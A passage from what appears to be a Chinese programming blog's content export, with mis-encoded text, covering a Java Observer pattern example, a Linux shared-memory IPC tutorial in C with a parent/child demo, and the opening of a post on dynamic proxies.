<h3 id="æŠ½è±¡è¢«è§‚å¯Ÿè€…"><a href="#æŠ½è±¡è¢«è§‚å¯Ÿè€…" class="headerlink" title="æŠ½è±¡è¢«è§‚å¯Ÿè€…"></a>æŠ½è±¡è¢«è§‚å¯Ÿè€…</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Subject</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> observer éœ€è¦æ³¨å†Œçš„è§‚å¯Ÿè€…</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">registerObserver</span><span class="params">(Observer observer)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> observer éœ€è¦æ³¨é”€çš„è§‚å¯Ÿè€…</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">removeObserver</span><span class="params">(Observer observer)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> msg éœ€è¦å‘é€çš„é€šçŸ¥</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">notify</span><span class="params">(String msg)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å…·ä½“è§‚å¯Ÿè€…"><a href="#å…·ä½“è§‚å¯Ÿè€…" class="headerlink" title="å…·ä½“è§‚å¯Ÿè€…"></a>å…·ä½“è§‚å¯Ÿè€…</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ³¨æ„ï¼šåŸç”ŸJDKä¸­ java.util.Observer ä¹Ÿæœ‰ Observer æ¥å£ï¼Œæˆ‘ä»¬è¿™é‡Œç”¨çš„æ˜¯è‡ªå®šä¹‰çš„</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ObserverIplm</span> <span class="keyword">implements</span> <span class="title">Observer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ObserverIplm</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">(String msg)</span> </span>&#123;</span><br><span class="line">        System.out.println(name + <span class="string">"æ”¶åˆ°æ–°å†…å®¹ï¼Œä¸ºï¼š"</span> + msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å…·ä½“è¢«è§‚å¯Ÿè€…"><a href="#å…·ä½“è¢«è§‚å¯Ÿè€…" class="headerlink" title="å…·ä½“è¢«è§‚å¯Ÿè€…"></a>å…·ä½“è¢«è§‚å¯Ÿè€…</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SubjectIplm</span> <span class="keyword">implements</span> <span class="title">Subject</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Observer&gt; observerList = <span class="keyword">new</span> ArrayList&lt;Observer&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registerObserver</span><span class="params">(Observer observer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.observerList.add(observer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">removeObserver</span><span class="params">(Observer observer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.observerList.remove(observer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// é€šçŸ¥æ‰€æœ‰è§‚å¯Ÿè€…</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">notify</span><span class="params">(String msg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (Observer item : observerList) &#123;</span><br><span class="line">            item.update(msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="æµ‹è¯•ç±»"><a href="#æµ‹è¯•ç±»" class="headerlink" title="æµ‹è¯•ç±»"></a>æµ‹è¯•ç±»</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ObserverTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Subject mySubject = <span class="keyword">new</span> SubjectIplm();</span><br><span class="line">        Observer myObserver1 = <span class="keyword">new</span> ObserverIplm(<span class="string">"myObserver1"</span>);</span><br><span class="line">        Observer myObserver2 = <span class="keyword">new</span> ObserverIplm(<span class="string">"myObserver2"</span>);</span><br><span class="line">        mySubject.registerObserver(myObserver1);</span><br><span class="line">        mySubject.registerObserver(myObserver2);</span><br><span class="line">        mySubject.notify(<span class="string">"éœ‡æƒŠï¼Javaå±…ç„¶æ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€ï¼"</span>);</span><br><span class="line">        System.out.println(<span class="string">"====================="</span>);</span><br><span class="line">        <span class="comment">// myObserver1 é¢‡ä¸ºéœ‡æƒŠ æœæ–­å–æ¶ˆè®¢é˜…ï¼ˆCç”Ÿä¸‡ç‰©ï¼‰</span></span><br><span class="line">        mySubject.removeObserver(myObserver1);</span><br><span class="line">        mySubject.notify(<span class="string">"Javaå¤©ä¸‹ç¬¬ä¸€ï¼"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">myObserver1æ”¶åˆ°æ–°å†…å®¹ï¼Œä¸ºï¼šéœ‡æƒŠï¼Javaå±…ç„¶æ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€ï¼</span><br><span class="line">myObserver2æ”¶åˆ°æ–°å†…å®¹ï¼Œä¸ºï¼šéœ‡æƒŠï¼Javaå±…ç„¶æ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€ï¼</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">myObserver2æ”¶åˆ°æ–°å†…å®¹ï¼Œä¸ºï¼šJavaå¤©ä¸‹ç¬¬ä¸€ï¼</span><br></pre></td></tr></table></figure>

<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><ul>
<li><p>ä¼˜ç‚¹ï¼šé™ä½äº†è€¦åˆï¼Œä½¿å¾—è€¦åˆçš„è§‚å¯Ÿè€…å’Œè¢«è§‚å¯Ÿè€…éƒ½åªä¾èµ–äºæŠ½è±¡æ¥å£ï¼Œä»è€Œå„è‡ªçš„å˜æ¢éƒ½ä¸ä¼šå½±å“å¦ä¸€æ–¹ã€‚</p>
</li>
<li><p>ç¼ºç‚¹ï¼šæ¶ˆæ¯é€šçŸ¥æ˜¯é¡ºåºè¿›è¡Œï¼Œé‚£ä¹ˆä¸€ä¸ªè§‚å¯Ÿè€…å¡é¡¿ï¼Œä¼šå½±å“æ•´ä½“çš„æ‰§è¡Œæ•ˆç‡ ã€‚</p>
</li>
</ul>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>è§‚å¯Ÿè€…</tag>
      </tags>
  </entry>
  <entry>
    <title>è¿›ç¨‹ä¹‹é—´ä½¿ç”¨å…±äº«å†…å­˜é€šä¿¡</title>
    <url>/2020/04/22/%E8%BF%9B%E7%A8%8B%E4%B9%8B%E9%97%B4%E4%BD%BF%E7%94%A8%E5%85%B1%E4%BA%AB%E5%86%85%E5%AD%98%E9%80%9A%E4%BF%A1/</url>
    <content><![CDATA[<h2 id="å…±äº«å†…å­˜"><a href="#å…±äº«å†…å­˜" class="headerlink" title="å…±äº«å†…å­˜"></a>å…±äº«å†…å­˜</h2><p>å…±äº«å†…å­˜å°±æ˜¯æ˜ å°„ä¸€æ®µèƒ½è¢«å…¶ä»–è¿›ç¨‹æ‰€è®¿é—®çš„å†…å­˜ï¼Œè¿™æ®µå…±äº«å†…å­˜ç”±ä¸€ä¸ªè¿›ç¨‹åˆ›å»ºï¼Œä½†å¤šä¸ªè¿›ç¨‹éƒ½å¯ä»¥è®¿é—®ã€‚å…±äº«å†…å­˜æ˜¯æœ€å¿«çš„ IPC æ–¹å¼ï¼Œå®ƒæ˜¯é’ˆå¯¹å…¶ä»–è¿›ç¨‹é—´é€šä¿¡æ–¹å¼è¿è¡Œæ•ˆç‡ä½è€Œä¸“é—¨è®¾è®¡çš„ã€‚<a id="more"></a></p>
<p>ä½†æ˜¯å®ƒå¹¶æœªæä¾›åŒæ­¥æœºåˆ¶ï¼Œå³åœ¨æŸä¸€ä¸ªè¿›ç¨‹ç»“æŸå¯¹å…±äº«å†…å­˜çš„å†™æ“ä½œä¹‹å‰ï¼Œå¹¶ä¸èƒ½å¯ä»¥é˜»æ­¢ç¬¬äºŒä¸ªè¿›ç¨‹å¼€å§‹å¯¹å®ƒè¿›è¡Œè¯»å–ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦äººä¸ºé˜»æ­¢é€šè¿‡å…¶ä»–æœºåˆ¶è¿›è¡ŒåŒæ­¥ã€‚</p>
<h2 id="shmget-å‡½æ•°"><a href="#shmget-å‡½æ•°" class="headerlink" title="shmget()å‡½æ•°"></a>shmget()å‡½æ•°</h2><p>ç”¨äºå¾—åˆ°ä¸€ä¸ªå…±äº«å†…å­˜æ ‡è¯†ç¬¦æˆ–åˆ›å»ºä¸€ä¸ªå…±äº«å†…å­˜ã€‚</p>
<p>å‡½æ•°åŸå‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shmget</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">size_t</span> <span class="built_in">size</span>, <span class="keyword">int</span> shmflg)</span></span>;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>key</td>
<td>æ ‡è¯†å…±äº«å†…å­˜çš„é”®å€¼ï¼Œshmget()å‡½æ•°æˆåŠŸæ—¶è¿”å›ä¸€ä¸ªä¸keyç›¸å…³çš„å…±äº«å†…å­˜æ ‡è¯†ç¬¦ï¼ˆéè´Ÿæ•´æ•°ï¼‰ï¼Œç”¨äºåç»­çš„å…±äº«å†…å­˜å‡½æ•°ã€‚è°ƒç”¨å¤±è´¥è¿”å›-1.</td>
</tr>
<tr>
<td>size</td>
<td>æŒ‡æ˜å…±äº«å†…å­˜çš„å¤§å°ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½</td>
</tr>
<tr>
<td>shmflg</td>
<td>æƒé™æ ‡å¿—<br>IPC_CREAT  å¦‚æœå…±äº«å†…å­˜ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºä¸€ä¸ªå…±äº«å†…å­˜ï¼Œå¦åˆ™æ‰“å¼€æ“ä½œã€‚<br>  IPC_EXCL  åªæœ‰åœ¨å…±äº«å†…å­˜ä¸å­˜åœ¨çš„æ—¶å€™ï¼Œæ–°çš„å…±äº«å†…å­˜æ‰å»ºç«‹ï¼Œå¦åˆ™å°±äº§ç”Ÿé”™è¯¯ã€‚</td>
</tr>
</tbody></table>
<h2 id="shmat-å‡½æ•°"><a href="#shmat-å‡½æ•°" class="headerlink" title="shmat()å‡½æ•°"></a>shmat()å‡½æ•°</h2><p>ç¬¬ä¸€æ¬¡åˆ›å»ºå®Œå…±äº«å†…å­˜åï¼Œå®ƒè¿˜ä¸èƒ½è¢«ä»»ä½•è¿›ç¨‹è®¿é—®ï¼Œ<code>shmat()</code>å‡½æ•°çš„ä½œç”¨å°±æ˜¯ç”¨æ¥å¯åŠ¨å¯¹è¯¥å…±äº«å†…å­˜çš„è®¿é—®ï¼Œå¹¶æŠŠå…±äº«å†…å­˜è¿æ¥åˆ°å½“å‰è¿›ç¨‹çš„åœ°å€ç©ºé—´ã€‚</p>
<p>åŸå‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">shmat</span><span class="params">(<span class="keyword">int</span> shmid, <span class="keyword">const</span> <span class="keyword">void</span> *shmaddr, <span class="keyword">int</span> shmflg)</span></span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>shmid</td>
<td>å…±äº«å­˜å‚¨çš„idï¼Œå¦‚shmget()å‡½æ•°çš„è¿”å›å€¼</td>
</tr>
<tr>
<td>shmaddr</td>
<td>æŒ‡å®šå…±äº«å†…å­˜è¿æ¥åˆ°å½“å‰è¿›ç¨‹ä¸­çš„åœ°å€ä½ç½®ï¼Œä¸€èˆ¬ä¸º0ï¼Œè¡¨ç¤ºè®©å†…æ ¸è‡ªå·±å†³å®šä¸€ä¸ªåˆé€‚çš„åœ°å€ä½ç½®</td>
</tr>
<tr>
<td>shmflg</td>
<td>SHM_RDONLYï¼šä¸ºåªè¯»æ¨¡å¼ï¼Œå…¶ä»–ä¸ºè¯»å†™æ¨¡å¼ï¼Œå¦‚0</td>
</tr>
</tbody></table>
<p>è°ƒç”¨æˆåŠŸæ—¶è¿”å›ä¸€ä¸ªæŒ‡å‘å…±äº«å†…å­˜ç¬¬ä¸€ä¸ªå­—èŠ‚çš„æŒ‡é’ˆï¼Œå¦‚æœè°ƒç”¨å¤±è´¥è¿”å›-1ã€‚</p>
<h2 id="shmdt-å‡½æ•°"><a href="#shmdt-å‡½æ•°" class="headerlink" title="shmdt()å‡½æ•°"></a>shmdt()å‡½æ•°</h2><p>ä¸<code>shmat</code>å‡½æ•°ç›¸åï¼Œæ˜¯ç”¨æ¥æ–­å¼€ä¸å…±äº«å†…å­˜é™„åŠ ç‚¹çš„åœ°å€ï¼Œç¦æ­¢æœ¬è¿›ç¨‹è®¿é—®æ­¤ç‰‡å…±äº«å†…å­˜ï¼Œä½†æ˜¯å¹¶ä¸æ˜¯åˆ é™¤è¯¥å…±äº«å†…å­˜ã€‚</p>
<p>åŸå‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shmdt</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *shmaddr)</span></span>;</span><br></pre></td></tr></table></figure>

<p><strong>shmaddr</strong>:è¿æ¥çš„å…±äº«å†…å­˜çš„èµ·å§‹åœ°å€ï¼Œå¦‚<code>shmat()</code>å‡½æ•°çš„è¿”å›å€¼ã€‚è°ƒç”¨æˆåŠŸçš„æ—¶å€™è¿”å›0ï¼Œå¤±è´¥æ—¶è¿”å›-1ã€‚</p>
<h2 id="shmctl-å‡½æ•°"><a href="#shmctl-å‡½æ•°" class="headerlink" title="shmctl()å‡½æ•°"></a>shmctl()å‡½æ•°</h2><p>æ§åˆ¶å…±äº«å†…å­˜ã€‚</p>
<p>åŸå‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shmctl</span><span class="params">(<span class="keyword">int</span> shm_id, <span class="keyword">int</span> command, struct shmid_ds *buf)</span></span>;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>shm_id</td>
<td>å…±äº«å†…å­˜æ ‡è¯†ç¬¦ï¼Œå¦‚shmget()çš„è¿”å›å€¼</td>
</tr>
<tr>
<td>command</td>
<td>ä¸€äº›å‘½ä»¤ï¼Œå¦‚<br>IPC_STATï¼šå¾—åˆ°å…±äº«å†…å­˜çš„çŠ¶æ€ï¼ŒæŠŠå…±äº«å†…å­˜çš„shmid_dsç»“æ„å¤åˆ¶åˆ°bufä¸­<br>IPC_SETï¼šå¦‚æœè¿›ç¨‹æœ‰è¶³å¤Ÿçš„æƒé™ï¼Œå°±æŠŠå…±äº«å†…å­˜çš„å½“å‰å…³è”å€¼è®¾ç½®ä¸ºshmid_dsç»“æ„ä¸­ç»™å‡ºçš„å€¼<br>IPC_RMIDï¼šåˆ é™¤è¿™ç‰‡å…±äº«å†…å­˜</td>
</tr>
<tr>
<td>buf</td>
<td>å…±äº«å†…å­˜ç®¡ç†ç»“æ„ä½“ã€‚</td>
</tr>
</tbody></table>
<p>shmid_dsç»“æ„ è‡³å°‘åŒ…æ‹¬ä»¥ä¸‹æˆå‘˜ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct shmid_ds</span><br><span class="line">&#123;</span><br><span class="line">    uid_t shm_perm.uid;</span><br><span class="line">    uid_t shm_perm.gid;</span><br><span class="line">    mode_t shm_perm.mode;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>ä¾‹å¦‚ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼Œçˆ¶å­è¿›ç¨‹é€šè¿‡å…±äº«å†…å­˜çš„æ–¹å¼è¿›è¡Œé€šä¿¡ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: YaleXin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-04-22 14:22:16</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-04-22 21:38:34</span></span><br><span class="line"><span class="comment"> * @LastEditors: YaleXin</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @FilePath: \my_c_workspace\others\shareMemory.c</span></span><br><span class="line"><span class="comment"> * @ç¥ˆç¥·ä¸å‡ºç°BUG</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shareMemoryDate</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> mod;</span><br><span class="line">    <span class="keyword">char</span> msg[<span class="number">100</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> *shm = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">shareMemoryDate</span> *<span class="title">share</span>;</span></span><br><span class="line">    <span class="comment">// åˆ›å»ºä¸€ä¸ªå…±äº«å†…å­˜</span></span><br><span class="line">    <span class="comment">// IPC_CREATè¡¨ç¤ºå¦‚æœå…±äº«å†…å­˜ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºä¸€ä¸ªå…±äº«å†…å­˜ï¼Œå¦åˆ™æ‰“å¼€æ“ä½œã€‚</span></span><br><span class="line">    <span class="comment">// éœ€è¦ä¸IPCå¯¹è±¡å­˜å–æƒé™ï¼ˆå¦‚0600ï¼‰è¿›è¡Œ|è¿ç®—æ¥ç¡®å®šä¿¡å·é‡é›†çš„å­˜å–æƒé™</span></span><br><span class="line">    <span class="keyword">int</span> shm_id =</span><br><span class="line">        shmget((<span class="keyword">key_t</span>)<span class="number">0</span>, <span class="keyword">sizeof</span>(struct shareMemoryDate), <span class="number">0600</span> | IPC_CREAT);</span><br><span class="line">    <span class="keyword">if</span> (shm_id == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"åˆ›å»ºå…±äº«å†…å­˜å¤±è´¥ï¼Œæˆ‘ä¹Ÿä¸çŸ¥ä¸ºä»€ä¹ˆ\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> pId = fork();</span><br><span class="line">    <span class="keyword">if</span> (pId == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"åˆ›å»ºå­è¿›ç¨‹å¤±è´¥ï¼Œæˆ‘ä¹Ÿä¸çŸ¥ä¸ºä»€ä¹ˆ\n"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pId == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//å­è¿›ç¨‹</span></span><br><span class="line">        <span class="comment">// å°†å…±äº«å†…å­˜è¿æ¥åˆ°å½“å‰è¿›ç¨‹çš„åœ°å€ç©ºé—´</span></span><br><span class="line">        shm = shmat(shm_id, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (shm == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"é“¾æ¥å¤±è´¥ï¼Œæˆ‘ä¹Ÿä¸çŸ¥ä¸ºä»€ä¹ˆ\n"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        share = (struct shareMemoryDate *)shm;</span><br><span class="line">        <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">100</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"æˆ‘æ˜¯å­è¿›ç¨‹ï¼Œè¯·è¾“å…¥æƒ³è¦å†™å…¥å…±äº«å†…å­˜çš„å†…å®¹:\n"</span>);</span><br><span class="line">        fgets(<span class="built_in">buffer</span>, <span class="keyword">sizeof</span>(<span class="built_in">buffer</span>), <span class="built_in">stdin</span>);</span><br><span class="line">        <span class="built_in">strcpy</span>(share-&gt;msg, <span class="built_in">buffer</span>);</span><br><span class="line">        <span class="comment">// è¡¨ç¤ºå°†æ•°æ®å†™å…¥å®Œæ¯•</span></span><br><span class="line">        share-&gt;mod = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// æŠŠå…±äº«å†…å­˜ä»å½“å‰è¿›ç¨‹ä¸­åˆ†ç¦»</span></span><br><span class="line">        <span class="keyword">if</span> (shmdt(shm) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"åˆ†ç¦»å¤±è´¥ï¼Œæˆ‘ä¹Ÿä¸çŸ¥ä¸ºä»€ä¹ˆ\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pId &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//çˆ¶è¿›ç¨‹</span></span><br><span class="line">        <span class="comment">// å°†å…±äº«å†…å­˜è¿æ¥åˆ°å½“å‰è¿›ç¨‹çš„åœ°å€ç©ºé—´</span></span><br><span class="line">        shm = shmat(shm_id, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (shm == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"é“¾æ¥å¤±è´¥ï¼Œæˆ‘ä¹Ÿä¸çŸ¥ä¸ºä»€ä¹ˆ\n"</span>);</span><br><span class="line">            <span class="comment">// åˆ é™¤å…±äº«å†…å­˜</span></span><br><span class="line">            <span class="keyword">if</span> (shmctl(shm_id, IPC_RMID, <span class="number">0</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"ï¼ˆæ— æ³•é“¾æ¥ï¼‰åˆ é™¤å…±äº«å†…å­˜å¤±è´¥ï¼Œæˆ‘ä¹Ÿä¸çŸ¥ä¸ºä»€ä¹ˆ\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        share = (struct shareMemoryDate *)shm;</span><br><span class="line">        <span class="comment">//ç­‰å¾…å­è¿›ç¨‹å†™å…¥å®Œæ¯•</span></span><br><span class="line">        <span class="keyword">while</span> (share-&gt;mod != <span class="number">1</span>) sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"æˆ‘æ˜¯çˆ¶è¿›ç¨‹ï¼Œè®©æˆ‘çœ‹çœ‹æˆ‘çš„å­è¿›ç¨‹åœ¨å…±äº«å†…å­˜é‡Œè¾¹å†™äº†ä»€ä¹ˆä¸œè¥¿ï¼š\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, share-&gt;msg);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"å™¢ï¼ŒåŸæ¥æ˜¯è¿™äº›é¬¼ç©æ„\n"</span>);</span><br><span class="line">        <span class="comment">// åˆ é™¤å…±äº«å†…å­˜</span></span><br><span class="line">        <span class="keyword">if</span> (shmctl(shm_id, IPC_RMID, <span class="number">0</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"(è¯»å–å®Œæ¯•)åˆ é™¤å…±äº«å†…å­˜å¤±è´¥ï¼Œæˆ‘ä¹Ÿä¸çŸ¥ä¸ºä»€ä¹ˆ\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è°ƒè¯•ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yalexin@yalexin-PC:/media/yalexin/è½¯ä»¶/my_c_workspace/others$ gcc -o share shareMemory.c</span><br><span class="line">yalexin@yalexin-PC:/media/yalexin/è½¯ä»¶/my_c_workspace/others$ ./share</span><br><span class="line">æˆ‘æ˜¯å­è¿›ç¨‹ï¼Œè¯·è¾“å…¥æƒ³è¦å†™å…¥å…±äº«å†…å­˜çš„å†…å®¹:</span><br><span class="line">ä½ å¥½å•Š</span><br><span class="line">æˆ‘æ˜¯çˆ¶è¿›ç¨‹ï¼Œè®©æˆ‘çœ‹çœ‹æˆ‘çš„å­è¿›ç¨‹åœ¨å…±äº«å†…å­˜é‡Œè¾¹å†™äº†ä»€ä¹ˆä¸œè¥¿ï¼š</span><br><span class="line">ä½ å¥½å•Š</span><br><span class="line"></span><br><span class="line">å™¢ï¼ŒåŸæ¥æ˜¯è¿™äº›é¬¼ç©æ„</span><br><span class="line">yalexin@yalexin-PC:/media/yalexin/è½¯ä»¶/my_c_workspace/others$</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Linuxç›¸å…³</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>è¿›ç¨‹é€šä¿¡</tag>
      </tags>
  </entry>
  <entry>
    <title>è®¾è®¡æ¨¡å¼ä¹‹åŠ¨æ€ä»£ç†</title>
    <url>/2020/05/10/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<p>ä¸Šæ–‡ä»‹ç»äº†<a href="https://yalexin.gitee.io/2020/05/10/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86/">é™æ€ä»£ç†</a>,æœ¬æ–‡ä»‹ç»åŠ¨æ€ä»£ç†ã€‚</p>
<p>æ‰€è°“åŠ¨æ€ï¼Œæ˜¯æŒ‡ä»£ç†ç±»æ˜¯åŠ¨æ€ç”Ÿæˆçš„ï¼Œè€Œä¸æ˜¯æˆ‘ä»¬æå‰å®šä¹‰å¥½çš„ã€‚</p>
<p>åŠ¨æ€ä»£ç†å®ç°çš„æ–¹å¼</p>
<ul>
<li>åŸç”ŸJDKï¼ˆæ¯”è¾ƒå¸¸ç”¨ï¼‰</li>
<li>CGLIBï¼ˆéœ€è¦å¯¼åŒ… cloud-cglib.jar ï¼‰</li>
</ul>
<p>è¿™é‡Œä»‹ç»åˆ©ç”¨åŸç”ŸJDKçš„æ–¹å¼å®ç°<a id="more"></a></p>
